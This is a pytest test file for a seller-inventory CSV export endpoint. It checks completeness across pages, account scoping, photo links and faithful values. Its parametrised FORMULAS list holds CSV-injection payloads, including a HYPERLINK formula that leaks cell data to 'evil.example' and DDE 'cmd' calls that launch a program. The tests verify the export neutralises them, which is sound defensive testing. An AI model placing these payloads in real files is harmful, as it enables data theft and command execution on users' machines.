"""`GET /api/listings/export.csv`: the seller's inventory, in a spreadsheet.

The store lives in a JSON column behind a login. An export is the answer to
"it's my stuff, let me have it" — a backup, an inventory count, the file an
accountant or an insurer asks for, the thing a seller takes with them if they
leave. So the bar is not "it produced a CSV"; it is:

  - EVERY listing, not the tab that happens to be open and not the page the
    grid has loaded. Drafts, live, sold, ended and Shop Mode finds alike;
  - past the grid's page size, by paging the store rather than reading one
    page and calling it the store — the failure that would be invisible,
    because a file of the first 200 looks exactly like a complete one;
  - a link to every PHOTO, which is the part of a listing this app made, and
    the same links eBay is given at publish so the two can be checked against
    each other;
  - the record as recorded: no asking price quietly copied into the sold
    column, no cell shortened, an empty cell meaning the record is empty;
  - and it must not fire a formula when it is opened. Every title and
    description in here was written by an AI draft or imported from eBay, and
    a cell beginning "=" is a program to Excel, Numbers and Sheets.

That last one is the reason this file leads with it.
"""
from __future__ import annotations

import csv
import io

import pytest

pytest.importorskip("fastapi")
pytest.importorskip("anthropic")
pytest.importorskip("PIL")

from fastapi.testclient import TestClient

from backend import main, ratelimit
from backend.services import listing_export

SHADOW = {"title": "What eBay last told us", "price": 39.0}


def _rows(client, path="/api/listings/export.csv"):
    """The export parsed back, as (header, list-of-dict-rows)."""
    res = client.get(path)
    assert res.status_code == 200, res.text
    text = res.text
    # The literal mark, not the module's constant: asserting against the
    # constant would still pass if it were emptied, which is exactly the
    # regression this line is here for.
    assert text.startswith("﻿"), (
        "no UTF-8 byte-order mark — Excel on Windows reads the file as the "
        "system codepage and every accented title arrives as mojibake")
    reader = csv.reader(io.StringIO(text[1:]))
    header = next(reader)
    return header, [dict(zip(header, row)) for row in reader], res


@pytest.fixture()
def seller(dbmod):
    """One signed-in seller with a listing in every state the store has.

    Through the real app and the real schema (`dbmod` binds a scratch SQLite
    file), so this exercises the query, the paging and the serialisation the
    route actually uses rather than a double's idea of them.
    """
    db = dbmod
    # Signups are rate limited per client IP and every test here signs one up;
    # run late enough in a session and the fixture 429s instead of the
    # assertions running. The limit stays in force for the request under test.
    ratelimit.reset()
    client = TestClient(main.app)
    r = client.post("/api/auth/signup",
                    json={"email": "export@example.com", "password": "password123"})
    assert r.status_code < 400, r.text
    uid = db.get_user_by_email("export@example.com")["id"]

    db.upsert_listing("sess-live", {
        "title": "Nike Windbreaker", "brand": "Nike", "price": 48.0,
        "currency": "USD", "quantity": 1, "condition": "USED_EXCELLENT",
        "description": "<p>Bold colourblock, full zip.</p>",
        "images": ["a.jpg", "b.jpg"],
        "item_specifics": [{"name": "Brand", "value": "Nike"},
                           {"name": "Size", "value": "L"}],
        "ebay_listing_id": "110011223344",
        "remote_shadow": dict(SHADOW), "dirty_fields": ["price"],
    }, status="published", user_id=uid)
    db.upsert_listing("sess-draft", {
        "title": "Levi's 501, unmeasured", "price": 60.0, "currency": "USD",
        "images": ["c.jpg"],
    }, status="draft", user_id=uid)
    db.upsert_listing("sess-find", {
        "title": "Thrifted Pyrex bowl", "purchase_price": 3.0, "currency": "USD",
    }, status="unlisted", user_id=uid)
    db.upsert_listing("sess-ended", {
        "title": "Ended, unsold", "price": 20.0, "currency": "USD",
        "ended_at": "2026-02-02T00:00:00+00:00",
    }, status="ended", user_id=uid)
    # An eBay import: no local photo files, eBay's own absolute URLs, and a
    # sale that settled BELOW the asking price.
    db.upsert_listing("ebay-77", {
        "title": "Vintage Coach bag", "price": 140.0, "sold_price": 112.5,
        "sold_quantity": 1, "sold_at": "2026-03-04T10:00:00+00:00",
        "currency": "USD", "source": "ebay", "sku": "COACH-77",
        "image_urls": ["https://i.ebayimg.com/images/g/AAA/s-l1600.jpg",
                       "https://i.ebayimg.com/images/g/BBB/s-l1600.jpg"],
        "ebay_listing_id": "220022334455",
        "view_url": "https://www.ebay.co.uk/itm/220022334455",
    }, status="sold", user_id=uid)
    return client


# --- every listing, whatever state it is in ---------------------------------

def test_the_export_carries_every_listing_in_the_store(seller):
    """Not the open tab and not the loaded page — the whole account."""
    _, rows, _ = _rows(seller)
    assert {r["id"] for r in rows} == {
        "sess-live", "sess-draft", "sess-find", "sess-ended", "ebay-77"}


def test_each_row_says_which_state_its_listing_is_in(seller):
    _, rows, _ = _rows(seller)
    by_id = {r["id"]: r for r in rows}
    assert by_id["sess-live"]["status"] == "published"
    assert by_id["sess-draft"]["status"] == "draft"
    assert by_id["sess-find"]["status"] == "unlisted"
    assert by_id["sess-ended"]["status"] == "ended"
    assert by_id["ebay-77"]["status"] == "sold"


def test_a_store_bigger_than_one_page_is_exported_whole(dbmod, monkeypatch):
    """The failure this test exists for is silent.

    The route reads the store a page at a time. Read one page and stop and the
    file is perfectly well-formed, opens cleanly, and is missing most of the
    seller's inventory — with nothing anywhere to say so. So: more listings
    than fit in a page, and every one of them accounted for exactly once.
    """
    db = dbmod
    monkeypatch.setattr(main, "EXPORT_PAGE_SIZE", 3)
    ratelimit.reset()
    client = TestClient(main.app)
    r = client.post("/api/auth/signup",
                    json={"email": "paged@example.com", "password": "password123"})
    assert r.status_code < 400, r.text
    uid = db.get_user_by_email("paged@example.com")["id"]
    ids = [f"sess-{i:03d}" for i in range(11)]        # three full pages + two
    for n, listing_id in enumerate(ids):
        db.upsert_listing(listing_id, {"title": f"Item {n}", "price": float(n)},
                          status="draft", user_id=uid)

    _, rows, _ = _rows(client)
    got = [r["id"] for r in rows]
    assert sorted(got) == sorted(ids)
    assert len(got) == len(set(got)), "a listing was exported twice"


def test_one_sellers_export_holds_nobody_elses_listings(dbmod):
    """The read is scoped by account, like every other read in the app."""
    db = dbmod
    ratelimit.reset()
    client = TestClient(main.app)
    assert client.post("/api/auth/signup",
                       json={"email": "mine@example.com",
                             "password": "password123"}).status_code < 400
    mine = db.get_user_by_email("mine@example.com")["id"]
    db.upsert_listing("mine-1", {"title": "Mine"}, status="draft", user_id=mine)
    db.upsert_listing("theirs-1", {"title": "Theirs"}, status="draft",
                      user_id="somebody-else")

    _, rows, _ = _rows(client)
    assert [r["id"] for r in rows] == ["mine-1"]


def test_logged_out_there_is_nothing_to_export(dbmod):
    ratelimit.reset()
    res = TestClient(main.app).get("/api/listings/export.csv")
    assert res.status_code == 401
    assert "Log in" in res.json()["detail"]


# --- the photos -------------------------------------------------------------

def test_a_listing_made_here_exports_a_link_to_every_photo(seller):
    """App-created listings hold FILENAMES. A filename in a spreadsheet is
    useless; what goes in the file is the public URL that serves it — the
    same /media URL eBay is handed at publish."""
    _, rows, _ = _rows(seller)
    row = {r["id"]: r for r in rows}["sess-live"]
    links = row["image_urls"].split(listing_export.MULTI_SEP)
    assert links == ["http://testserver/media/sess-live/optimized/a.jpg",
                     "http://testserver/media/sess-live/optimized/b.jpg"]
    assert row["image_count"] == "2"


def test_an_imported_listing_exports_ebays_own_photo_urls(seller):
    """Imported listings have no local files at all — eBay hosts the photos
    and the record carries those absolute URLs. Both kinds land in the same
    column, so one formula in the spreadsheet reaches every photo."""
    _, rows, _ = _rows(seller)
    row = {r["id"]: r for r in rows}["ebay-77"]
    assert row["image_urls"].split(listing_export.MULTI_SEP) == [
        "https://i.ebayimg.com/images/g/AAA/s-l1600.jpg",
        "https://i.ebayimg.com/images/g/BBB/s-l1600.jpg"]
    assert row["image_count"] == "2"


def test_a_listing_with_no_photos_says_none_rather_than_guessing(seller):
    _, rows, _ = _rows(seller)
    row = {r["id"]: r for r in rows}["sess-find"]
    assert row["image_urls"] == ""
    assert row["image_count"] == "0"


def test_the_photo_links_are_absolute(seller):
    """A relative path is a link that works in the app and nowhere else — and
    a spreadsheet is the definition of nowhere else."""
    _, rows, _ = _rows(seller)
    for row in rows:
        for link in filter(None, row["image_urls"].split(listing_export.MULTI_SEP)):
            assert link.startswith(("http://", "https://")), link


# --- a spreadsheet runs what it opens ---------------------------------------

FORMULAS = [
    '=HYPERLINK("http://evil.example/steal?x="&A1,"Invoice")',
    '+1+cmd|\' /C calc\'!A0',
    '-2+3+cmd|\' /C calc\'!A0',
    '@SUM(1+9)*cmd|\' /C calc\'!A0',
    '\t=1+1',
]


@pytest.mark.parametrize("payload", FORMULAS)
def test_a_title_cannot_smuggle_a_formula_into_the_spreadsheet(dbmod, payload):
    """Titles and descriptions come from an AI draft or an eBay import, and
    the seller opens this file in Excel. Every one of these is a documented
    CSV-injection payload; each has to arrive as TEXT."""
    db = dbmod
    ratelimit.reset()
    client = TestClient(main.app)
    assert client.post("/api/auth/signup",
                       json={"email": "inject@example.com",
                             "password": "password123"}).status_code < 400
    uid = db.get_user_by_email("inject@example.com")["id"]
    db.upsert_listing("sess-x", {"title": payload, "description": payload},
                      status="draft", user_id=uid)

    _, rows, _ = _rows(client)
    for cell in (rows[0]["title"], rows[0]["description"]):
        assert cell.startswith("'"), f"{cell!r} would be evaluated"
        assert cell[1:] == payload, "the text itself must survive intact"


def test_a_negative_number_is_still_a_number(seller):
    """The guard above must not fire on "-4.50". A cost basis the seller
    wants to SUM has to stay a number, not become a string with an apostrophe
    in front of it — that is the whole point of a spreadsheet."""
    assert listing_export._guard("-4.5") == "-4.5"
    assert listing_export._guard("-4") == "-4"
    assert listing_export._guard("+1.25e3") == "+1.25e3"
    assert listing_export._guard("-2+3+cmd|' /C calc'!A0").startswith("'")


# --- the record as recorded -------------------------------------------------

def test_an_asking_price_is_never_reported_as_what_it_sold_for(seller):
    """`price` is the ask and stays the ask after a sale; `sold_price` is what
    the buyer paid. Folding one into the other overstates the take on every
    accepted offer, auction close and markdown in the file."""
    _, rows, _ = _rows(seller)
    by_id = {r["id"]: r for r in rows}
    assert by_id["ebay-77"]["price"] == "140"
    assert by_id["ebay-77"]["sold_price"] == "112.5"
    # Never sold: the sold column is EMPTY, not the asking price.
    assert by_id["sess-live"]["price"] == "48"
    assert by_id["sess-live"]["sold_price"] == ""


def test_money_carries_the_currency_it_was_recorded_in(seller):
    _, rows, _ = _rows(seller)
    assert {r["id"]: r["currency"] for r in rows}["ebay-77"] == "USD"
    assert "currency" in listing_export.COLUMNS


def test_a_blank_cell_means_the_record_is_blank(seller):
    """Not "we didn't work it out". A zero invented for an empty cost basis
    averages into every profit calculation built on this file."""
    _, rows, _ = _rows(seller)
    assert {r["id"]: r for r in rows}["sess-live"]["purchase_price"] == ""
    assert {r["id"]: r for r in rows}["sess-find"]["purchase_price"] == "3"


def test_a_number_the_record_cannot_really_hold_does_not_break_the_file(seller):
    """NaN and infinity are what `json.dumps` writes by default, so the JSON
    column really can carry one — and `int()` raises on both. Inside a
    streaming response that is not an error page, it is a file that stops
    mid-row. The raw value goes through as text instead."""
    assert listing_export._number(float("nan")) == "nan"
    assert listing_export._number(float("inf")) == "inf"
    assert listing_export._number(48.0) == "48"
    assert listing_export._number(112.5) == "112.5"
    assert listing_export._number("") == ""
    assert listing_export._number(0) == "0", "a recorded zero is not a blank"


def test_the_dates_a_seller_reports_on_are_all_there(seller):
    _, rows, _ = _rows(seller)
    by_id = {r["id"]: r for r in rows}
    assert by_id["ebay-77"]["sold_at"] == "2026-03-04T10:00:00+00:00"
    assert by_id["sess-ended"]["ended_at"] == "2026-02-02T00:00:00+00:00"
    assert by_id["sess-live"]["created_at"]
    assert by_id["sess-live"]["updated_at"]


def test_a_listing_links_back_to_where_a_buyer_would_see_it(seller):
    """eBay's own URL when the import carried one — it names the right
    domain, which a guess cannot for a seller on ebay.co.uk. The /itm/ form
    only where an id is all we have."""
    _, rows, _ = _rows(seller)
    by_id = {r["id"]: r for r in rows}
    assert by_id["ebay-77"]["listing_url"] == \
        "https://www.ebay.co.uk/itm/220022334455"
    assert by_id["sess-live"]["listing_url"] == \
        "https://www.ebay.com/itm/110011223344"
    assert by_id["sess-draft"]["listing_url"] == ""


def test_item_specifics_come_along(seller):
    _, rows, _ = _rows(seller)
    assert {r["id"]: r for r in rows}["sess-live"]["item_specifics"] == \
        "Brand=Nike | Size=L"


def test_a_description_with_commas_quotes_and_newlines_survives(dbmod):
    """RFC 4180 quoting, checked by reading the file back rather than by
    eyeballing it: this is the one thing a hand-rolled CSV writer gets wrong,
    and it corrupts every row after the bad one."""
    db = dbmod
    ratelimit.reset()
    client = TestClient(main.app)
    assert client.post("/api/auth/signup",
                       json={"email": "quoting@example.com",
                             "password": "password123"}).status_code < 400
    uid = db.get_user_by_email("quoting@example.com")["id"]
    nasty = 'Size "L", worn twice.\nSmoke-free home, no returns.'
    db.upsert_listing("sess-q", {"title": "Tee", "description": nasty},
                      status="draft", user_id=uid)
    db.upsert_listing("sess-after", {"title": "The row after"},
                      status="draft", user_id=uid)

    _, rows, _ = _rows(client)
    by_id = {r["id"]: r for r in rows}
    assert by_id["sess-q"]["description"] == nasty
    assert by_id["sess-after"]["title"] == "The row after", \
        "the quoting broke and swallowed the following row"


def test_a_long_description_is_not_shortened(dbmod):
    """An export that quietly trims what the seller wrote is worse than a
    large file: they would only discover it by comparing, which is the thing
    the export was supposed to save them."""
    db = dbmod
    ratelimit.reset()
    client = TestClient(main.app)
    assert client.post("/api/auth/signup",
                       json={"email": "long@example.com",
                             "password": "password123"}).status_code < 400
    uid = db.get_user_by_email("long@example.com")["id"]
    long_text = "Measurements. " * 4000            # ~56 KB
    db.upsert_listing("sess-long", {"title": "Jacket", "description": long_text},
                      status="draft", user_id=uid)

    _, rows, _ = _rows(client)
    assert rows[0]["description"] == long_text


# --- what the file does NOT carry -------------------------------------------

def test_the_export_does_not_ship_the_sync_ledger(seller):
    """Same rule as GET /api/listings: the merge base and the dirty-field
    ledger are the server's bookkeeping. They are not a seller's inventory,
    they are half the payload, and nothing outside the server reads them."""
    res = seller.get("/api/listings/export.csv")
    assert "remote_shadow" not in res.text
    assert "What eBay last told us" not in res.text
    for field in main.LIST_OMITTED_LISTING_FIELDS:
        assert field not in listing_export.COLUMNS


# --- the download itself ----------------------------------------------------

def test_it_arrives_as_a_dated_csv_file_to_save(seller):
    """A browser has to SAVE this, not render it, and the name has to say
    what it is and when it was taken — a seller ends up with several."""
    res = seller.get("/api/listings/export.csv")
    assert res.headers["content-type"].startswith("text/csv")
    assert "charset=utf-8" in res.headers["content-type"]
    disposition = res.headers["content-disposition"]
    assert disposition.startswith("attachment;")
    assert "thryft-listings-" in disposition and disposition.endswith('.csv"')


def test_the_headers_say_how_many_listings_the_store_holds(seller):
    """So a short file can be told from a whole one. Nothing can change a
    status code once bytes are on the wire, which is exactly why the count
    goes in a header the client can check the row count against."""
    _, rows, res = _rows(seller)
    assert res.headers["X-Export-Total"] == str(len(rows)) == "5"
    assert "X-Export-Truncated" not in res.headers


def test_a_store_past_the_cap_admits_the_download_was_cut(dbmod, monkeypatch):
    """The cap is a resource guard, not a product limit — but a guard that
    hands over a short file silently is worse than no export at all."""
    db = dbmod
    monkeypatch.setattr(main, "EXPORT_PAGE_SIZE", 2)
    monkeypatch.setattr(main, "EXPORT_CAP", 2)
    ratelimit.reset()
    client = TestClient(main.app)
    assert client.post("/api/auth/signup",
                       json={"email": "capped@example.com",
                             "password": "password123"}).status_code < 400
    uid = db.get_user_by_email("capped@example.com")["id"]
    for n in range(5):
        db.upsert_listing(f"sess-{n}", {"title": f"Item {n}"},
                          status="draft", user_id=uid)

    _, rows, res = _rows(client)
    assert len(rows) == 2
    assert res.headers["X-Export-Total"] == "5"
    assert res.headers["X-Export-Truncated"] == "2"


def test_a_store_that_cannot_be_read_is_not_an_empty_spreadsheet(seller,
                                                                 monkeypatch):
    """The ordinary failure, and the one worth getting right: a file that
    downloads and turns out to hold a header row reads as "you have no
    listings". The first page is fetched BEFORE the response begins so this
    is a 503 with a sentence in it instead."""
    from backend import db as dbmod_live
    from backend import errors

    def _boom(*a, **k):
        raise errors.StorageUnavailable("We couldn’t load your listings just now.")

    monkeypatch.setattr(dbmod_live, "list_listings", _boom)
    res = seller.get("/api/listings/export.csv")
    assert res.status_code == 503
    assert "couldn’t load your listings" in res.json()["detail"]


def test_the_export_is_the_whole_store_not_the_grids_page(seller, monkeypatch):
    """The grid caps what it downloads because it renders full JSON records on
    a phone. That cap must not silently become the export's: they are
    different questions, and this one was asked for the whole answer."""
    monkeypatch.setattr(main, "LIST_CAP", 2)
    _, rows, _ = _rows(seller)
    assert len(rows) == 5


def test_the_route_is_not_read_as_a_listing_called_export_csv():
    """Routes match in definition order, so `/api/listings/export.csv` has to
    stay ABOVE `/api/listings/{listing_id}`. Below it, the export becomes a
    404 for a listing nobody has — and the fix looks like a routing typo."""
    paths = [getattr(r, "path", "") for r in main.app.routes
             if "GET" in (getattr(r, "methods", None) or set())]
    assert paths.index("/api/listings/export.csv") < \
        paths.index("/api/listings/{listing_id}")


def test_the_columns_are_appended_to_never_inserted_into():
    """A spreadsheet somebody built a formula against is a file format.
    Inserting a column in the middle moves every column after it, silently,
    in files that already exist. The first columns are pinned here so that
    change has to be a deliberate one."""
    assert listing_export.COLUMNS[:4] == ("id", "status", "title", "subtitle")
    assert listing_export.COLUMNS[-2:] == ("image_count", "image_urls")
    assert len(set(listing_export.COLUMNS)) == len(listing_export.COLUMNS)


def test_every_row_has_exactly_one_cell_per_column(seller):
    header, rows, _ = _rows(seller)
    assert header == list(listing_export.COLUMNS)
    for row in rows:
        assert len(row) == len(listing_export.COLUMNS)
